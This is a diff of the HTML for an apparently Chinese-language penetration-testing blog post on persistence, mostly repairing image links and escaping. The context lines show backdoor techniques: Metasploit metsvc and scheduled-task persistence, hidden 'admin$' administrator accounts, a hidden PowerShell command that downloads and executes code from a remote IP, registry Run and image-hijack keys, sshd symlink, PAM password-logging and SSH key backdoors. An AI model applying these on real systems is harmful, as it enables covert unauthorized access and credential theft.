@@ -132,7 +132,7 @@
 <h2 id="0x01-MSF"><a href="#0x01-MSF" class="headerlink" title="0x01 MSF"></a>0x01 MSF</h2><h3 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h3><blockquote>
 <p>msf内置的后渗透权限维持工具persistence</p>
 </blockquote>
-<p><img src="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct0179234ffee75f4c00.png" alt="img"></p>
+<p><img src="/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%5Ct0179234ffee75f4c00.png" alt="img"></p>
 <h3 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h3><p>它是通过在已经获得shell的目标主机上开启了一个服务来提供后门的功能。<br><code>run Metsvc -h</code></p>
 <h3 id="Scheduleme-amp-Schtasksabuse"><a href="#Scheduleme-amp-Schtasksabuse" class="headerlink" title="Scheduleme &amp; Schtasksabuse"></a>Scheduleme &amp; Schtasksabuse</h3><p>msf中自动利用计划任务的后门程序，后面会聊到linux和windows平台的计划任务。</p>
 <pre class="line-numbers language-none"><code class="language-none">run scheduleme -h
@@ -164,8 +164,6 @@ set LPORT 5555
 set ExitOnSession false
 set AutoRunScript metsvc -A
 exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 
 <h2 id="0x02-计划任务"><a href="#0x02-计划任务" class="headerlink" title="0x02 计划任务"></a>0x02 计划任务</h2><p>无论是windows还是linux操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。自然而然我们可以在计划任务中做手脚，埋后门。</p>
 <h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
@@ -240,7 +238,7 @@ at 时间 -f 文件
 &#x2F;etc&#x2F;at.allow：#只有该名单里面的人可以使用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a><strong>crontab</strong></h4><blockquote>
-<p>注意：<br>（1）crontab 只会在/sbin、/bin、/usr/sbin、/usr/bin下查找命令，如果命令不在这些目录中，应该要使用绝对路径。<br>（2）只有root用户可以管理其他用户的周期性任务<br>（3）crontab在重启后之前的周期性任务无效，anacron可以弥补crontab的缺陷。配置文件：/etc/anacrontab。anacrontab会开机自动检查没有执行的计划任务，然乎逐一执行，这个过程是用户透明的。一般而言，crontab就已经可以满足基本的需求。</p>
+<p>注意：<br>（1）crontab 只会在&#x2F;sbin、&#x2F;bin、&#x2F;usr&#x2F;sbin、&#x2F;usr&#x2F;bin下查找命令，如果命令不在这些目录中，应该要使用绝对路径。<br>（2）只有root用户可以管理其他用户的周期性任务<br>（3）crontab在重启后之前的周期性任务无效，anacron可以弥补crontab的缺陷。配置文件：&#x2F;etc&#x2F;anacrontab。anacrontab会开机自动检查没有执行的计划任务，然乎逐一执行，这个过程是用户透明的。一般而言，crontab就已经可以满足基本的需求。</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">- 1.服务开启
  service crond start
@@ -260,7 +258,7 @@ crontab  -r  -u  用户名
 &#x2F;etc&#x2F;crontab            #cron服务配置文件：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>anacron</strong></p>
-<p>anacron是一个不同于crontab的任务，其只精确到天，用来弥补服务器在宕机下crond调度不周以及缓解计划任务执行过于集中的问题。它需要记录上次执行的时间，并更新到相应的/var/spool/anacron目录下，下次执行的时候会将当前时间和上次记录的时间进行对比，如果满足大于/etc/anacron的配置的天数就会立即执行相应的命令，然后刷新时间。</p>
+<p>anacron是一个不同于crontab的任务，其只精确到天，用来弥补服务器在宕机下crond调度不周以及缓解计划任务执行过于集中的问题。它需要记录上次执行的时间，并更新到相应的&#x2F;var&#x2F;spool&#x2F;anacron目录下，下次执行的时候会将当前时间和上次记录的时间进行对比，如果满足大于&#x2F;etc&#x2F;anacron的配置的天数就会立即执行相应的命令，然后刷新时间。</p>
 <pre class="line-numbers language-none"><code class="language-none">anacron 命令行参数：
 
 -t 配置文件路径
@@ -276,8 +274,6 @@ crontab  -r  -u  用户名
 -s
 串行地执行任务，只有前一个任务完成后才开始下一个任务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
 <h2 id="0x03-windows权限维持"><a href="#0x03-windows权限维持" class="headerlink" title="0x03 windows权限维持"></a>0x03 windows权限维持</h2><h3 id="影子账户"><a href="#影子账户" class="headerlink" title="影子账户"></a>影子账户</h3><p>创建一个无法用用户本机用户罗列工具显示的用户，并且赋予管理员权限。所有操作需要有管理员权限。同时测试在windows server 2012服务器域环境下影子账户无法直接进行添加。</p>
 <ol>
 <li><p>用’$’创建匿名用户，并归到administratorsa用户组</p>
@@ -285,12 +281,10 @@ crontab  -r  -u  用户名
 net localgroup administrators admin$ &#x2F;add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 </li>
 <li><p>导出匿名用户对应的sam目录下的注册表键值</p>
-<pre class="line-numbers language-none"><code class="language-none">regedt32.exe 打开 HKEY_LOCAL_MACHINESAMSAMDomainsAccountUsers键值，导出Names下用户目录以及对应的16进制目录。注意需要给Administrator用户赋予Sam键值权限，默认是不允许的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-</li>
+<pre class="line-numbers language-none"><code class="language-none">regedt32.exe 打开 HKEY_LOCAL_MACHINESAMSAMDomainsAccountUsers键值，导出Names下用户目录以及对应的16进制目录。注意需要给Administrator用户赋予Sam键值权限，默认是不允许的。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
-<p><a href="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct017ef640eb24d7c175.png"><img src="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct017ef640eb24d7c175.png" alt="img"></a></p>
-<p><a href="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct0125fadd704d547933.png"><img src="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct0125fadd704d547933.png" alt="img"></a></p>
+<p><a href="%5Ct017ef640eb24d7c175.png"><img src="/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%5Ct017ef640eb24d7c175.png" alt="img"></a></p>
+<p><a href="%5Ct0125fadd704d547933.png"><img src="/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%5Ct0125fadd704d547933.png" alt="img"></a></p>
 <p>删除匿名用户，双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。<code>net user</code>或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。</p>
 <pre class="line-numbers language-none"><code class="language-none">net user admin$ &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -309,7 +303,7 @@ net localgroup administrators admin$ &#x2F;add<span aria-hidden="true" class="li
 powershell.exe  -ExecutionPolicy Bypass -nop -w hidden -c $V&#x3D;new-object net.webclient;$V.proxy&#x3D;[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultCredentials;IEX $V.downloadstring(&#39;http:&#x2F;&#x2F;192.168.80.155:8888&#x2F;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="注册表开机启动"><a href="#注册表开机启动" class="headerlink" title="注册表开机启动"></a>注册表开机启动</h3><p>在如下的注册表目录下注入键值<code>HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun</code>，可以实现开机自启动。以windows defender为例:</p>
-<p><a href="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct0179bb2dd1964c04b6.png"><img src="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct0179bb2dd1964c04b6.png" alt="img"></a></p>
+<p><a href="%5Ct0179bb2dd1964c04b6.png"><img src="/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%5Ct0179bb2dd1964c04b6.png" alt="img"></a></p>
 <h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><blockquote>
 <p>细节参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/151425">https://www.anquanke.com/post/id/151425</a></p>
 </blockquote>
@@ -324,7 +318,7 @@ powershell.exe  -ExecutionPolicy Bypass -nop -w hidden -c $V&#x3D;new-object net
 3. 运行 iexplore.exe,bomb!!!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>当然我们也可以在第一步新键一个注册表文件目录，取名为想要覆盖的可执行程序，后续步骤类似。</p>
-<p><a href="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct01148a3195dd0338b4.png"><img src="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct01148a3195dd0338b4.png" alt="img"></a><br>但是这样明目张胆的偷梁换柱有点张扬，根据安全客那篇文章，修改另外两个注册表键值可以实现原程序退出后静默运行后门程序。以执行notepad为例，退出后静默运行calc.exe</p>
+<p><a href="%5Ct01148a3195dd0338b4.png"><img src="/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%5Ct01148a3195dd0338b4.png" alt="img"></a><br>但是这样明目张胆的偷梁换柱有点张扬，根据安全客那篇文章，修改另外两个注册表键值可以实现原程序退出后静默运行后门程序。以执行notepad为例，退出后静默运行calc.exe</p>
 <pre class="line-numbers language-none"><code class="language-none">reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionsnotepad.exe&quot; &#x2F;v GlobalFlag &#x2F;t REG_DWORD &#x2F;d 512
 
 reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; &#x2F;v ReportingMode &#x2F;t REG_DWORD &#x2F;d 1
@@ -339,8 +333,8 @@ reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentP
 右键属性&#x2F;安全&#x2F;编辑；
 选择Administrators（或者你的当前组）&#x2F;勾选完全控制&#x2F;确定；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><a href="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct01e54cf4479c3710de.png"><img src="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct01e54cf4479c3710de.png" alt="img"></a></p>
-<p><a href="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct0141ef780fa8554fc3.png"><img src="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct0141ef780fa8554fc3.png" alt="img"></a></p>
+<p><a href="%5Ct01e54cf4479c3710de.png"><img src="/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%5Ct01e54cf4479c3710de.png" alt="img"></a></p>
+<p><a href="%5Ct0141ef780fa8554fc3.png"><img src="/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%5Ct0141ef780fa8554fc3.png" alt="img"></a></p>
 <h2 id="0x04-linux权限维持"><a href="#0x04-linux权限维持" class="headerlink" title="0x04 linux权限维持"></a>0x04 linux权限维持</h2><p>可以看到windows的权限维持很多时候是基于注册表值，但是linux里面没有注册表项，但是有很多的配置文件选项，可以达到相似的功能。下面介绍一些比较实用的后门手段。</p>
 <h3 id="sshd软连接"><a href="#sshd软连接" class="headerlink" title="sshd软连接"></a>sshd软连接</h3><blockquote>
 <p>原理细节： <a target="_blank" rel="noopener" href="http://www.91ri.org/16803.html">http://www.91ri.org/16803.html</a></p>
@@ -434,8 +428,8 @@ void creat_daemon(void)
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><a href="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct012c2522ddb6268bbd.png"><img src="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct012c2522ddb6268bbd.png" alt="img"></a></p>
-<p><a href="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct01a93c727d6dff50fa.png"><img src="%5C2019%5C03%5C%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%5Ct01a93c727d6dff50fa.png" alt="img"></a></p>
+<p><a href="%5Ct012c2522ddb6268bbd.png"><img src="/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%5Ct012c2522ddb6268bbd.png" alt="img"></a></p>
+<p><a href="%5Ct01a93c727d6dff50fa.png"><img src="/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%5Ct01a93c727d6dff50fa.png" alt="img"></a></p>
 <h3 id="linux-PAM密码记录后门"><a href="#linux-PAM密码记录后门" class="headerlink" title="linux PAM密码记录后门"></a>linux PAM密码记录后门</h3><p>pam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://blog.51cto.com/redkey/1343316">https://blog.51cto.com/redkey/1343316</a></p>
@@ -445,7 +439,7 @@ void creat_daemon(void)
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>当然也可以使用prompt_command进行提权,参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/155943">https://www.anquanke.com/post/id/155943</a></p>
-<h3 id="ssh免密后门"><a href="#ssh免密后门" class="headerlink" title="ssh免密后门"></a>ssh免密后门</h3><p>把id_rsa.pub写入服务端的/home/[用户名]/.ssh/authorized_keys中。</p>
+<h3 id="ssh免密后门"><a href="#ssh免密后门" class="headerlink" title="ssh免密后门"></a>ssh免密后门</h3><p>把id_rsa.pub写入服务端的&#x2F;home&#x2F;[用户名]&#x2F;.ssh&#x2F;authorized_keys中。</p>
 <h3 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h3><p>rootit的后门相对比较顽固，有应用级别和系统级别的rootkit，其大致的思路是hook进常规的调用中，是比较硬核的，经常体现在APT攻击中。下面是一个菊苣收集的rootkit后门的链接。具体的细节因为不同的rootkit具体实现不一致，笔者才疏，无法完全弄清楚，仅给出链接，方便日后学习。</p>
 
           </div>
@@ -455,7 +449,7 @@ void creat_daemon(void)
                     <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
                     <p>原文链接：<a href="https://misakikata.github.io/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">https://misakikata.github.io/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</a>
                     <p>发表日期：<a href="https://misakikata.github.io/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">March 8th 2019, 9:24:46 am</a>
-                    <p>更新日期：<a href="https://misakikata.github.io/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">March 8th 2019, 9:40:48 am</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">January 9th 2023, 10:58:18 am</a>
                     <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
